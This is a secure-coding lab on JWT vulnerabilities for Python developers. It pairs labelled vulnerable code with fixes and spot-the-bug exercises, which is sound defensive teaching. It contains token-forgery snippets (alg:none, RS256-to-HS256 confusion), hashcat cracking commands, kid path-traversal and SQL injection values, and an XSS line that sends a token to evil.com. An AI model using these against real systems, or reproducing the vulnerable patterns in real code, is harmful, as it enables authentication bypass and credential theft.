# Lab: JWT Security for Python Developers

## Module Overview

| Attribute | Value |
|-----------|-------|
| **Module ID** | EG-LAB-JWT-001 |
| **Type** | Hands-on Security Lab |
| **Primary Audience** | Python Developers, AppSec Engineers |
| **Prerequisite** | Software Domain L1 (Secure Coding Basics) |
| **Duration** | L1: 1 hour, L2: 2 hours, L3: 3 hours |
| **Language** | Python (PyJWT, python-jose, cryptography) |
| **Version** | 1.0 |

---

## Module Purpose

JSON Web Tokens (JWTs) are everywhere in modern authentication - API authorization, SSO, microservice communication. But insecure JWT implementations are one of the most common sources of authentication bypass and privilege escalation vulnerabilities.

This lab teaches you to **spot vulnerable JWT patterns** in Python code and **implement secure alternatives** using real-world library examples.

---

## Level 1: CRAWL - JWT Security Fundamentals

### Learning Objectives

After completing L1, learners will be able to:

1. Explain JWT structure and how signing works
2. Identify the `alg: none` vulnerability and why it's dangerous
3. Recognize weak signing secrets that can be brute-forced
4. Validate essential JWT claims (exp, aud, iss)
5. Spot common JWT vulnerabilities in Python code

---

### 1.1 JWT Structure and How Signing Works

**What is a JWT?**

A JSON Web Token is a compact, URL-safe token format consisting of three Base64URL-encoded parts separated by dots:

```
header.payload.signature
```

| Part | Contains | Example |
|------|----------|---------|
| **Header** | Algorithm and token type | `{"alg": "HS256", "typ": "JWT"}` |
| **Payload** | Claims (data) | `{"sub": "user123", "role": "admin", "exp": 1700000000}` |
| **Signature** | Cryptographic verification | `HMACSHA256(base64url(header) + "." + base64url(payload), secret)` |

**How Signing Protects Integrity:**

```
                    ┌──────────────┐
                    │  JWT Header  │──┐
                    │  alg: HS256  │  │
                    └──────────────┘  │     ┌────────────┐
                                      ├────>│  HMAC-SHA256│──> Signature
                    ┌──────────────┐  │     │  (secret)  │
                    │  JWT Payload │──┘     └────────────┘
                    │  sub, role,  │
                    │  exp, iss    │
                    └──────────────┘
```

The signature ensures that if **anyone modifies the header or payload**, the signature will no longer match - and the token should be rejected.

**Two Signing Approaches:**

| Method | How It Works | Use Case |
|--------|-------------|----------|
| **HMAC (HS256/HS384/HS512)** | Symmetric - same secret signs and verifies | Single service, simple setups |
| **RSA/ECDSA (RS256/ES256)** | Asymmetric - private key signs, public key verifies | Microservices, third-party verification |

**Python Example - Creating a JWT:**

```python
import jwt
from datetime import datetime, timedelta, timezone

payload = {
    "sub": "user123",
    "role": "viewer",
    "exp": datetime.now(timezone.utc) + timedelta(hours=1),
    "iss": "myapp.example.com",
    "aud": "api.example.com"
}

token = jwt.encode(payload, "secret-key", algorithm="HS256")
```

**Key Takeaway:** JWTs are signed, not encrypted. Anyone can read the payload by Base64-decoding it. The signature only prevents tampering - it does NOT hide the contents.

---

### 1.2 The `alg: none` Attack

**The Vulnerability:**

The JWT spec includes an `"alg": "none"` option for unsigned tokens. If a server accepts `alg: none`, an attacker can forge any token by simply removing the signature.

**Vulnerable Python Code:**

```python
# VULNERABLE: Accepts any algorithm including "none"
import jwt

def verify_token(token):
    try:
        payload = jwt.decode(
            token,
            "my-secret-key",
            algorithms=["HS256", "none"]  # DANGER: accepts unsigned tokens!
        )
        return payload
    except jwt.InvalidTokenError:
        return None
```

**Why This Is Dangerous:**

An attacker can craft a token with `"alg": "none"`, set any claims they want (e.g., `"role": "admin"`), and omit the signature entirely. The server will accept it as valid.

**Attack Example:**

```python
# What an attacker does:
import base64
import json

# Craft header with alg: none
header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b"=").decode()

# Craft payload with elevated privileges
payload = base64.urlsafe_b64encode(
    json.dumps({"sub": "attacker", "role": "admin"}).encode()
).rstrip(b"=").decode()

# No signature needed!
forged_token = f"{header}.{payload}."
```

**Secure Python Code:**

```python
# SECURE: Explicitly allow only specific algorithms
import jwt

def verify_token(token):
    try:
        payload = jwt.decode(
            token,
            "my-secret-key",
            algorithms=["HS256"]  # ONLY accept HS256 - never "none"
        )
        return payload
    except jwt.InvalidTokenError:
        return None
```

**Key Takeaway:** Always specify an explicit `algorithms` list with only the algorithm(s) you use. Never include `"none"`. PyJWT v2.4+ rejects `alg: none` by default, but always be explicit.

---

### 1.3 Weak Signing Secrets

**The Vulnerability:**

HMAC-based JWTs (HS256/HS384/HS512) use a shared secret. If the secret is weak, short, or predictable, an attacker can brute-force it offline using tools like `hashcat` or `jwt-cracker`, then forge any token they want.

**Vulnerable Python Code:**

```python
# VULNERABLE: Weak, guessable secret
import jwt
from datetime import datetime, timedelta, timezone

SECRET = "password123"  # DANGER: brute-forceable in seconds

def create_token(user_id, role):
    payload = {
        "sub": user_id,
        "role": role,
        "exp": datetime.now(timezone.utc) + timedelta(hours=1)
    }
    return jwt.encode(payload, SECRET, algorithm="HS256")

def verify_token(token):
    return jwt.decode(token, SECRET, algorithms=["HS256"])
```

**Common Weak Secrets Found in the Wild:**

```
secret
password
password123
mysecretkey
changeme
test
jwt_secret
your-256-bit-secret  (from jwt.io example!)
```

**How Attackers Exploit This:**

```bash
# Attacker brute-forces the secret offline (no rate limiting possible!)
$ hashcat -m 16500 jwt_token.txt wordlist.txt
# Or uses jwt-cracker:
$ jwt-cracker -t eyJhbGciOiJIUzI1NiJ9... -d 6
# Found: "secret" in 0.3 seconds
```

Once the secret is known, the attacker can forge tokens with any claims.

**Secure Python Code:**

```python
# SECURE: Strong, randomly generated secret
import jwt
import secrets
from datetime import datetime, timedelta, timezone

# Generate a cryptographically strong 256-bit secret
# Store this in environment variable or secrets manager, NOT in code
SECRET = secrets.token_hex(32)  # 64-char hex = 256 bits

# In production, load from environment:
# SECRET = os.environ["JWT_SECRET"]

def create_token(user_id, role):
    payload = {
        "sub": user_id,
        "role": role,
        "exp": datetime.now(timezone.utc) + timedelta(hours=1)
    }
    return jwt.encode(payload, SECRET, algorithm="HS256")

def verify_token(token):
    return jwt.decode(token, SECRET, algorithms=["HS256"])
```

**Secret Strength Guidelines:**

| Secret Type | Entropy | Time to Brute-Force | Verdict |
|-------------|---------|---------------------|---------|
| `"secret"` | ~30 bits | Seconds | Broken |
| `"MyApp2024!"` | ~50 bits | Hours | Weak |
| `secrets.token_hex(32)` | 256 bits | Heat death of universe | Secure |
| RSA-2048 key pair | 2048 bits | Not feasible | Secure |

**Key Takeaway:** Use `secrets.token_hex(32)` or longer for HMAC secrets. Better yet, use asymmetric keys (RS256/ES256) so there's no shared secret to leak. Never hardcode secrets in source code.

---

### 1.4 Missing Claims Validation

**The Vulnerability:**

Even with a valid signature, a JWT can be insecure if the server doesn't validate critical claims: expiration (`exp`), audience (`aud`), issuer (`iss`), and not-before (`nbf`).

**Vulnerable Python Code - No Expiration Check:**

```python
# VULNERABLE: Tokens never expire
import jwt

def create_token(user_id):
    payload = {
        "sub": user_id,
        "role": "user"
        # DANGER: no "exp" claim - token lives forever!
    }
    return jwt.encode(payload, SECRET, algorithm="HS256")

def verify_token(token):
    return jwt.decode(
        token, SECRET,
        algorithms=["HS256"],
        options={"verify_exp": False}  # DANGER: explicitly disabling expiry check!
    )
```

**Why This Is Dangerous:**

- Stolen tokens work forever - no way to invalidate them
- Leaked tokens in logs, browser history, or old backups remain valid
- No forced rotation - compromised sessions persist indefinitely

**Vulnerable Python Code - No Audience/Issuer Validation:**

```python
# VULNERABLE: Accepts tokens from any issuer for any audience
import jwt

def verify_token(token):
    payload = jwt.decode(
        token, SECRET,
        algorithms=["HS256"]
        # DANGER: no audience or issuer validation!
        # A token minted for "billing-api" works on "admin-api"
    )
    return payload
```

**Secure Python Code - Full Claims Validation:**

```python
# SECURE: Validates all critical claims
import jwt
from datetime import datetime, timedelta, timezone

def create_token(user_id, role):
    now = datetime.now(timezone.utc)
    payload = {
        "sub": user_id,
        "role": role,
        "exp": now + timedelta(hours=1),      # Expires in 1 hour
        "iat": now,                             # Issued at
        "nbf": now,                             # Not valid before now
        "iss": "auth.myapp.com",                # Who issued this token
        "aud": "api.myapp.com",                 # Who should accept it
        "jti": secrets.token_hex(16)            # Unique token ID (for revocation)
    }
    return jwt.encode(payload, SECRET, algorithm="HS256")

def verify_token(token):
    try:
        payload = jwt.decode(
            token,
            SECRET,
            algorithms=["HS256"],
            audience="api.myapp.com",     # Reject if aud doesn't match
            issuer="auth.myapp.com",      # Reject if iss doesn't match
            options={
                "require": ["exp", "iss", "aud", "sub"]  # All required
            }
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise AuthError("Token has expired")
    except jwt.InvalidAudienceError:
        raise AuthError("Token audience mismatch")
    except jwt.InvalidIssuerError:
        raise AuthError("Token issuer mismatch")
    except jwt.InvalidTokenError as e:
        raise AuthError(f"Invalid token: {e}")
```

**Claims Reference:**

| Claim | Purpose | What Happens Without It |
|-------|---------|------------------------|
| `exp` | Expiration time | Tokens never expire, stolen tokens work forever |
| `iat` | Issued at | Can't detect old tokens or enforce max age |
| `nbf` | Not before | Tokens can be used before intended start time |
| `iss` | Issuer | Cross-service token confusion attacks |
| `aud` | Audience | Token for Service A accepted by Service B |
| `sub` | Subject | Can't identify who the token belongs to |
| `jti` | JWT ID | Can't revoke or detect replay of specific tokens |

**Key Takeaway:** Always set `exp` with a reasonable TTL (15 min to 1 hour for access tokens). Always validate `aud` and `iss`. Use `options={"require": [...]}` to ensure critical claims are present.

---

### 1.5 Spot the Vulnerability Exercises

**Exercise 1: Find the Bug**

```python
import jwt

app_secret = "super-secret-key-2024"

def authenticate(token):
    try:
        data = jwt.decode(token, app_secret, algorithms=["HS256", "HS384", "HS512", "none"])
        user = get_user(data["sub"])
        if user and data.get("role") == "admin":
            return user, True
        return user, False
    except:
        return None, False
```

<details>
<summary>Vulnerabilities (click to reveal)</summary>

1. **`alg: none` accepted** - `algorithms` list includes `"none"`, allowing unsigned token forgery
2. **Weak secret** - `"super-secret-key-2024"` is dictionary-attackable
3. **No expiration validation** - no `exp` claim required
4. **Bare `except`** - swallows all errors silently, hiding attack indicators
5. **Role from token only** - trusts the token's role claim without checking the database
</details>

---

**Exercise 2: Find the Bug**

```python
import jwt
from flask import request, jsonify

SECRET = os.environ.get("JWT_SECRET", "fallback-secret")

@app.route("/api/user/profile")
def get_profile():
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    payload = jwt.decode(token, SECRET, algorithms=["HS256"])
    return jsonify(get_user_profile(payload["sub"]))

@app.route("/api/admin/users")
def list_users():
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    payload = jwt.decode(token, SECRET, algorithms=["HS256"])
    if payload.get("admin"):
        return jsonify(get_all_users())
    return jsonify({"error": "forbidden"}), 403
```

<details>
<summary>Vulnerabilities (click to reveal)</summary>

1. **Fallback secret** - `os.environ.get("JWT_SECRET", "fallback-secret")` uses a weak default if env var is missing. Production should crash, not fall back.
2. **No error handling** - `jwt.decode` exceptions crash the endpoint (500 error), leaking stack traces
3. **No audience validation** - tokens from other services would be accepted
4. **Admin check from token** - trusts `admin` claim in the JWT without database verification; attacker who discovers the secret can set `"admin": true`
5. **Token parsing** - naive `replace("Bearer ", "")` doesn't handle missing/malformed headers safely
</details>

---

**Exercise 3: Find the Bug**

```python
import jwt
from datetime import datetime, timedelta

class TokenService:
    def __init__(self):
        self.secret = "my-jwt-secret"

    def create_access_token(self, user_id, permissions):
        return jwt.encode({
            "sub": user_id,
            "perms": permissions,
            "exp": datetime.utcnow() + timedelta(days=30)
        }, self.secret, algorithm="HS256")

    def create_refresh_token(self, user_id):
        return jwt.encode({
            "sub": user_id,
            "type": "refresh"
        }, self.secret, algorithm="HS256")

    def verify(self, token):
        return jwt.decode(token, self.secret, algorithms=["HS256"])
```

<details>
<summary>Vulnerabilities (click to reveal)</summary>

1. **Hardcoded weak secret** - `"my-jwt-secret"` in the class, not from config/env
2. **30-day access token** - access tokens should be 15 min to 1 hour; 30 days is far too long
3. **Refresh token never expires** - no `exp` on refresh tokens means they work forever
4. **Same secret for both token types** - a refresh token could be used as an access token and vice versa (no `aud` or `type` validation in `verify()`)
5. **`datetime.utcnow()` deprecated** - should use `datetime.now(timezone.utc)` (Python 3.12+)
6. **No issuer/audience** - cross-service token confusion possible
7. **Permissions in token** - if permissions change, token still has old permissions until expiry (30 days!)
</details>

---

## Level 2: WALK - Advanced JWT Attacks

### Learning Objectives

After completing L2, learners will be able to:

1. Explain and prevent algorithm confusion attacks (RS256 to HS256)
2. Identify Key ID (`kid`) injection vulnerabilities
3. Recognize JWK/JKU header injection risks
4. Implement secure token storage and transmission patterns
5. Apply defense-in-depth to JWT-based authentication

---

### 2.1 Algorithm Confusion Attack (RS256 to HS256)

**The Vulnerability:**

When a server uses RSA (asymmetric) signing, the **public key** is used to verify tokens. If the server also accepts HMAC (symmetric), an attacker can:

1. Obtain the public key (often freely available)
2. Sign a forged token using HMAC-SHA256 **with the public key as the HMAC secret**
3. The server uses the public key material for HMAC verification and the forged token passes

```
Normal Flow (RS256):
  Sign:   private_key → signature
  Verify: public_key  → valid ✓

Attack Flow (HS256 with public key as secret):
  Sign:   HMAC(payload, public_key_bytes) → signature
  Verify: Server uses public_key_bytes for HMAC → valid ✓  (!!!)
```

**Vulnerable Python Code:**

```python
# VULNERABLE: Accepts both RSA and HMAC algorithms
import jwt

PUBLIC_KEY = open("public_key.pem").read()
PRIVATE_KEY = open("private_key.pem").read()

def create_token(user_id):
    return jwt.encode(
        {"sub": user_id, "exp": datetime.now(timezone.utc) + timedelta(hours=1)},
        PRIVATE_KEY,
        algorithm="RS256"
    )

def verify_token(token):
    return jwt.decode(
        token,
        PUBLIC_KEY,
        algorithms=["RS256", "HS256"]  # DANGER: accepts both!
    )
```

**Attack Example:**

```python
# Attacker downloads the public key and uses it as HMAC secret
public_key_bytes = open("public_key.pem", "rb").read()

forged_token = jwt.encode(
    {"sub": "attacker", "role": "admin"},
    public_key_bytes,       # Using public key as HMAC secret!
    algorithm="HS256"       # Switch to HMAC
)
# Server verifies using public_key for HMAC → passes!
```

**Secure Python Code:**

```python
# SECURE: Only accept the algorithm you use for signing
import jwt

PUBLIC_KEY = open("public_key.pem").read()
PRIVATE_KEY = open("private_key.pem").read()

def create_token(user_id):
    return jwt.encode(
        {"sub": user_id, "exp": datetime.now(timezone.utc) + timedelta(hours=1)},
        PRIVATE_KEY,
        algorithm="RS256"
    )

def verify_token(token):
    return jwt.decode(
        token,
        PUBLIC_KEY,
        algorithms=["RS256"]  # ONLY RS256 - never mix symmetric and asymmetric
    )
```

**Defense Rules:**
- Never mix symmetric (HS*) and asymmetric (RS*, ES*, PS*) in the `algorithms` list
- If you sign with RS256, only accept RS256
- PyJWT v2.4+ has some protections, but always be explicit

**Key Takeaway:** The `algorithms` parameter is your primary defense. Treat it as a strict allowlist with exactly one algorithm.

---

### 2.2 Key ID (`kid`) Injection

**The Vulnerability:**

The JWT header can include a `kid` (Key ID) field that tells the server which key to use for verification. If the server uses `kid` in an unsafe way (e.g., as a file path or database query), an attacker can inject malicious values.

**Vulnerable Python Code - Path Traversal via kid:**

```python
# VULNERABLE: kid used as file path
import jwt
import json

def get_key_from_kid(kid):
    # DANGER: kid is attacker-controlled, used directly in file path!
    key_path = f"/app/keys/{kid}.pem"
    with open(key_path) as f:
        return f.read()

def verify_token(token):
    header = jwt.get_unverified_header(token)
    kid = header.get("kid", "default")
    key = get_key_from_kid(kid)
    return jwt.decode(token, key, algorithms=["HS256"])
```

**Attack:** Attacker sets `kid` to `"../../../dev/null"` - an empty file, making the key an empty string. Or `"../../../etc/hostname"` to use a known, predictable value as the signing key.

**Vulnerable Python Code - SQL Injection via kid:**

```python
# VULNERABLE: kid used in SQL query
import jwt
import sqlite3

def get_key_from_kid(kid):
    conn = sqlite3.connect("keys.db")
    # DANGER: SQL injection via kid!
    result = conn.execute(
        f"SELECT key_value FROM signing_keys WHERE kid = '{kid}'"
    ).fetchone()
    return result[0] if result else None
```

**Attack:** Attacker sets `kid` to `"' UNION SELECT 'known-secret' --"` to make the query return a key the attacker controls.

**Secure Python Code:**

```python
# SECURE: Validate kid against allowlist, use parameterized queries
import jwt
import re

VALID_KEYS = {
    "key-2024-primary": "actual-secret-key-primary",
    "key-2024-secondary": "actual-secret-key-secondary",
}

def verify_token(token):
    header = jwt.get_unverified_header(token)
    kid = header.get("kid")

    # Validate kid format (alphanumeric + hyphens only)
    if not kid or not re.match(r'^[a-zA-Z0-9\-]+$', kid):
        raise AuthError("Invalid key ID format")

    # Look up from allowlist - NOT from filesystem or database query
    key = VALID_KEYS.get(kid)
    if not key:
        raise AuthError(f"Unknown key ID: {kid}")

    return jwt.decode(token, key, algorithms=["HS256"])

# If you must use a database:
def get_key_from_db(kid):
    conn = get_db_connection()
    result = conn.execute(
        "SELECT key_value FROM signing_keys WHERE kid = ?",  # Parameterized!
        (kid,)
    ).fetchone()
    return result[0] if result else None
```

**Key Takeaway:** Treat `kid` as untrusted input. Validate its format, use allowlists when possible, and always use parameterized queries if looking up from a database. Never use `kid` in file paths.

---

### 2.3 JWK/JKU Header Injection

**The Vulnerability:**

JWT headers can include `jwk` (JSON Web Key - embedded key) or `jku` (JSON Web Key Set URL - URL to fetch keys from). If the server trusts these header values, an attacker can supply their own key or key server.

**Vulnerable Python Code - Trusting jwk from Token:**

```python
# VULNERABLE: Uses the key embedded in the token itself for verification
from jose import jwt as jose_jwt
import json
import base64

def verify_token(token):
    header = jose_jwt.get_unverified_header(token)

    if "jwk" in header:
        # DANGER: Attacker controls the verification key!
        key = header["jwk"]
        return jose_jwt.decode(token, key, algorithms=["RS256"])
```

**Attack:** Attacker generates their own RSA key pair, signs a forged token, and embeds their public key in the `jwk` header. The server uses the attacker's key to verify the attacker's token - which of course passes.

**Vulnerable Python Code - Trusting jku URL:**

```python
# VULNERABLE: Fetches keys from URL in the token
import requests
from jose import jwt as jose_jwt

def verify_token(token):
    header = jose_jwt.get_unverified_header(token)

    if "jku" in header:
        # DANGER: Attacker controls where keys are fetched from!
        jwks_response = requests.get(header["jku"])
        jwks = jwks_response.json()
        key = jwks["keys"][0]
        return jose_jwt.decode(token, key, algorithms=["RS256"])
```

**Attack:** Attacker sets `jku` to `"https://attacker.com/.well-known/jwks.json"` pointing to their own key server.

**Secure Python Code:**

```python
# SECURE: Only use pre-configured keys, never from the token itself
import jwt
import requests
from functools import lru_cache

# Hardcoded JWKS URL - NEVER from the token
JWKS_URL = "https://auth.myapp.com/.well-known/jwks.json"
ALLOWED_ISSUERS = {"https://auth.myapp.com"}

@lru_cache(maxsize=1)
def get_signing_keys():
    """Fetch keys from our trusted JWKS endpoint only."""
    response = requests.get(JWKS_URL, timeout=5)
    response.raise_for_status()
    jwks = response.json()
    return {
        key["kid"]: jwt.algorithms.RSAAlgorithm.from_jwk(key)
        for key in jwks["keys"]
        if key.get("use") == "sig"
    }

def verify_token(token):
    header = jwt.get_unverified_header(token)

    # IGNORE jwk/jku from the token header entirely
    if "jwk" in header or "jku" in header:
        raise AuthError("Embedded keys not accepted")

    kid = header.get("kid")
    keys = get_signing_keys()

    if kid not in keys:
        # Clear cache and retry once (key rotation)
        get_signing_keys.cache_clear()
        keys = get_signing_keys()
        if kid not in keys:
            raise AuthError(f"Unknown key ID: {kid}")

    return jwt.decode(
        token,
        keys[kid],
        algorithms=["RS256"],
        issuer="https://auth.myapp.com",
        audience="api.myapp.com"
    )
```

**Key Takeaway:** Never trust `jwk` or `jku` headers from the token. Always fetch keys from a pre-configured, trusted source. The token should never tell you how to verify itself.

---

### 2.4 Token Storage and Transmission Security

**The Vulnerability:**

Even a perfectly signed JWT can be compromised through insecure storage or transmission.

**Vulnerable Python Code - Token in localStorage (Frontend):**

```python
# VULNERABLE: API returns token for localStorage storage
from flask import Flask, jsonify, request

@app.route("/api/login", methods=["POST"])
def login():
    user = authenticate(request.json["username"], request.json["password"])
    if user:
        token = create_token(user.id)
        # DANGER: Client stores this in localStorage, vulnerable to XSS
        return jsonify({"access_token": token})
```

```javascript
// Frontend - VULNERABLE
// Any XSS vulnerability can steal the token
localStorage.setItem("token", response.access_token);
// Attacker's XSS payload: fetch('https://evil.com/steal?t=' + localStorage.token)
```

**Vulnerable Python Code - Token Over HTTP:**

```python
# VULNERABLE: No HTTPS enforcement, token in URL
@app.route("/api/data")
def get_data():
    # DANGER: Token in query string gets logged in server logs, browser history, referrer headers
    token = request.args.get("token")
    payload = verify_token(token)
    return get_data_for_user(payload["sub"])
```

**Secure Python Code - HttpOnly Cookie with Security Headers:**

```python
# SECURE: Token in HttpOnly cookie, not accessible to JavaScript
from flask import Flask, make_response, request

@app.route("/api/login", methods=["POST"])
def login():
    user = authenticate(request.json["username"], request.json["password"])
    if not user:
        return jsonify({"error": "invalid credentials"}), 401

    access_token = create_token(user.id)
    refresh_token = create_refresh_token(user.id)

    response = make_response(jsonify({"message": "logged in"}))

    # Access token in HttpOnly cookie - XSS can't read it
    response.set_cookie(
        "access_token",
        access_token,
        httponly=True,      # Not accessible via JavaScript
        secure=True,        # Only sent over HTTPS
        samesite="Strict",  # CSRF protection
        max_age=3600,       # 1 hour
        path="/api"         # Only sent to API routes
    )

    # Refresh token in separate HttpOnly cookie
    response.set_cookie(
        "refresh_token",
        refresh_token,
        httponly=True,
        secure=True,
        samesite="Strict",
        max_age=86400 * 7,  # 7 days
        path="/api/auth"    # Only sent to auth endpoints
    )

    return response

@app.route("/api/data")
def get_data():
    # Token comes from cookie, not header or query string
    token = request.cookies.get("access_token")
    if not token:
        return jsonify({"error": "unauthorized"}), 401
    payload = verify_token(token)
    return get_data_for_user(payload["sub"])
```

**Storage Comparison:**

| Method | XSS Vulnerable | CSRF Vulnerable | Recommendation |
|--------|---------------|-----------------|----------------|
| `localStorage` | Yes - JS can read | No | Avoid for tokens |
| `sessionStorage` | Yes - JS can read | No | Avoid for tokens |
| HttpOnly Cookie | No - JS can't read | Yes (mitigate with SameSite) | Preferred |
| Memory only | No (if no XSS) | No | Good for SPAs (lost on refresh) |

**Key Takeaway:** Store tokens in HttpOnly, Secure, SameSite=Strict cookies. Never put tokens in URLs. If using `Authorization` headers, store the token in memory (not localStorage) and accept the tradeoff of re-authentication on page refresh.

---

### 2.5 Spot the Vulnerability Exercises (L2)

**Exercise 4: Algorithm Confusion**

```python
import jwt
from cryptography.hazmat.primitives import serialization

class AuthService:
    def __init__(self, private_key_path, public_key_path):
        with open(private_key_path, "rb") as f:
            self.private_key = serialization.load_pem_private_key(f.read(), password=None)
        with open(public_key_path, "rb") as f:
            self.public_key = f.read()

    def issue_token(self, claims):
        return jwt.encode(claims, self.private_key, algorithm="RS256")

    def validate_token(self, token):
        header = jwt.get_unverified_header(token)
        algo = header.get("alg", "RS256")
        return jwt.decode(token, self.public_key, algorithms=[algo])
```

<details>
<summary>Vulnerabilities (click to reveal)</summary>

1. **Algorithm from token header** - `algorithms=[algo]` trusts the attacker-controlled `alg` header. Attacker sets `alg: HS256` and signs with the public key bytes.
2. **No claims validation** - No `exp`, `aud`, `iss`, or `sub` requirements
3. **Public key as bytes** - `self.public_key = f.read()` stores raw bytes, which can be directly used as an HMAC secret in algorithm confusion
4. **Fix:** Hardcode `algorithms=["RS256"]` and deserialize public key properly
</details>

---

**Exercise 5: Insecure Token Lifecycle**

```python
import jwt
import os
from datetime import datetime, timedelta, timezone
from flask import Flask, request, jsonify

app = Flask(__name__)
SECRET = os.environ["JWT_SECRET"]

@app.route("/auth/login", methods=["POST"])
def login():
    user = validate_credentials(request.json)
    if not user:
        return jsonify({"error": "bad credentials"}), 401

    token = jwt.encode({
        "sub": user["id"],
        "name": user["name"],
        "email": user["email"],
        "role": user["role"],
        "permissions": user["permissions"],
        "department": user["department"],
        "exp": datetime.now(timezone.utc) + timedelta(days=365)
    }, SECRET, algorithm="HS256")

    return jsonify({"token": token})

@app.route("/auth/change-password", methods=["POST"])
def change_password():
    token = request.headers.get("Authorization", "").removeprefix("Bearer ")
    payload = jwt.decode(token, SECRET, algorithms=["HS256"])
    update_password(payload["sub"], request.json["new_password"])
    return jsonify({"message": "password changed"})
```

<details>
<summary>Vulnerabilities (click to reveal)</summary>

1. **365-day expiration** - Access tokens should be 15 min to 1 hour, not a full year
2. **PII in token** - Email, name, department in the payload. JWTs are not encrypted - anyone who intercepts the token reads this data. Base64 is NOT encryption.
3. **No token invalidation after password change** - After changing password, old tokens should be revoked. Here old tokens remain valid for up to 365 days.
4. **No refresh token pattern** - Using a single long-lived token instead of short access + refresh token pair
5. **Permissions baked into token** - If a user's role or permissions change, the token still carries old values for up to a year
6. **No `iss`/`aud` claims** - Cross-service token confusion possible
7. **Token returned in response body** - Client will likely store in localStorage (XSS risk)
</details>

---

## Level 3: RUN - JWT Security Architecture

### Learning Objectives

After completing L3, learners will be able to:

1. Design a complete secure token lifecycle (issue, refresh, revoke)
2. Implement token revocation with deny-lists
3. Architect JWT security for microservices
4. Evaluate when to use JWTs vs. opaque session tokens

---

### 3.1 Token Lifecycle Management

**The Problem:**

JWTs are stateless - the server doesn't track issued tokens. This makes revocation (logout, password change, account compromise) challenging.

**Secure Token Lifecycle Pattern:**

```python
# SECURE: Complete token lifecycle with revocation support
import jwt
import secrets
import redis
from datetime import datetime, timedelta, timezone

# Short-lived access tokens + longer-lived refresh tokens
ACCESS_TOKEN_TTL = timedelta(minutes=15)
REFRESH_TOKEN_TTL = timedelta(days=7)

SECRET = os.environ["JWT_SECRET"]
REFRESH_SECRET = os.environ["JWT_REFRESH_SECRET"]  # Separate secret!

redis_client = redis.Redis(host="localhost", port=6379, db=0)

def issue_token_pair(user_id, role):
    """Issue short-lived access + longer-lived refresh token."""
    now = datetime.now(timezone.utc)
    jti = secrets.token_hex(16)  # Unique ID for revocation tracking

    access_token = jwt.encode({
        "sub": user_id,
        "role": role,
        "exp": now + ACCESS_TOKEN_TTL,
        "iat": now,
        "iss": "auth.myapp.com",
        "aud": "api.myapp.com",
        "type": "access",
        "jti": jti
    }, SECRET, algorithm="HS256")

    refresh_jti = secrets.token_hex(16)
    refresh_token = jwt.encode({
        "sub": user_id,
        "exp": now + REFRESH_TOKEN_TTL,
        "iat": now,
        "iss": "auth.myapp.com",
        "aud": "auth.myapp.com",    # Different audience!
        "type": "refresh",
        "jti": refresh_jti
    }, REFRESH_SECRET, algorithm="HS256")  # Different secret!

    return access_token, refresh_token

def verify_access_token(token):
    """Verify access token with deny-list check."""
    payload = jwt.decode(
        token, SECRET, algorithms=["HS256"],
        audience="api.myapp.com",
        issuer="auth.myapp.com",
        options={"require": ["exp", "sub", "jti", "type"]}
    )

    if payload.get("type") != "access":
        raise AuthError("Not an access token")

    # Check deny-list (for revoked tokens)
    if redis_client.exists(f"revoked:{payload['jti']}"):
        raise AuthError("Token has been revoked")

    return payload

def refresh_access_token(refresh_token):
    """Issue new access token using refresh token."""
    payload = jwt.decode(
        refresh_token, REFRESH_SECRET, algorithms=["HS256"],
        audience="auth.myapp.com",
        issuer="auth.myapp.com",
        options={"require": ["exp", "sub", "jti", "type"]}
    )

    if payload.get("type") != "refresh":
        raise AuthError("Not a refresh token")

    if redis_client.exists(f"revoked:{payload['jti']}"):
        raise AuthError("Refresh token has been revoked")

    # Rotate: revoke old refresh token, issue new pair
    revoke_token(payload["jti"], REFRESH_TOKEN_TTL)
    user = get_user(payload["sub"])
    return issue_token_pair(user["id"], user["role"])

def revoke_token(jti, ttl):
    """Add token to deny-list until it would have expired anyway."""
    redis_client.setex(
        f"revoked:{jti}",
        int(ttl.total_seconds()),  # Auto-cleanup after expiry
        "1"
    )

def logout(access_token, refresh_token):
    """Revoke both tokens on logout."""
    try:
        access_payload = jwt.decode(
            access_token, SECRET, algorithms=["HS256"],
            audience="api.myapp.com", issuer="auth.myapp.com"
        )
        revoke_token(access_payload["jti"], ACCESS_TOKEN_TTL)
    except jwt.InvalidTokenError:
        pass  # Access token already expired, that's fine

    try:
        refresh_payload = jwt.decode(
            refresh_token, REFRESH_SECRET, algorithms=["HS256"],
            audience="auth.myapp.com", issuer="auth.myapp.com"
        )
        revoke_token(refresh_payload["jti"], REFRESH_TOKEN_TTL)
    except jwt.InvalidTokenError:
        pass

def on_password_change(user_id):
    """Revoke ALL tokens for a user after password change."""
    # Store a "revoked before" timestamp - any token issued before this is invalid
    redis_client.set(
        f"user_revoked_before:{user_id}",
        datetime.now(timezone.utc).isoformat()
    )
```

**Token Lifecycle Diagram:**

```
  Login                  API Calls              Token Expired
    │                       │                       │
    ▼                       ▼                       ▼
┌─────────┐          ┌───────────┐          ┌──────────────┐
│  Issue   │          │  Verify   │          │   Refresh    │
│  Access  │──use──>  │  Access   │──expired─>│   Using      │
│  +Refresh│          │  Token    │          │  Refresh Tok │
└─────────┘          └───────────┘          └──────────────┘
                           │                       │
                      deny-list                issue new
                       check                   access token
                           │                  (rotate refresh)
                           ▼                       │
                     ┌───────────┐                 ▼
                     │  Revoke?  │           ┌───────────┐
                     │  Logout?  │           │ New Token  │
                     │  PW Change│           │   Pair     │
                     └───────────┘           └───────────┘
```

---

### 3.2 JWT vs. Opaque Tokens: When to Use Each

**Decision Framework:**

| Factor | JWT | Opaque Session Token |
|--------|-----|---------------------|
| **Stateless verification** | Yes - no DB lookup needed | No - requires session store |
| **Revocation** | Hard - needs deny-list | Easy - delete from store |
| **Size** | Large (1-2 KB+) | Small (32-64 bytes) |
| **Cross-service auth** | Excellent - any service can verify | Poor - requires shared session store |
| **Sensitive data** | Don't put PII in payload | Data stays server-side |
| **Scalability** | High - no shared state | Requires distributed session store |
| **Best for** | Microservices, APIs, SSO | Monoliths, web apps with server-rendered pages |

**Use JWTs when:**
- Multiple services need to verify authentication independently
- You need stateless, horizontally scalable auth
- You're building APIs consumed by third parties

**Use opaque tokens when:**
- You need instant revocation (logout must be immediate)
- You're building a monolithic web application
- Token payload would contain sensitive data

**Hybrid Pattern (recommended for most apps):**

```python
# Use opaque refresh tokens (stored server-side) + JWT access tokens

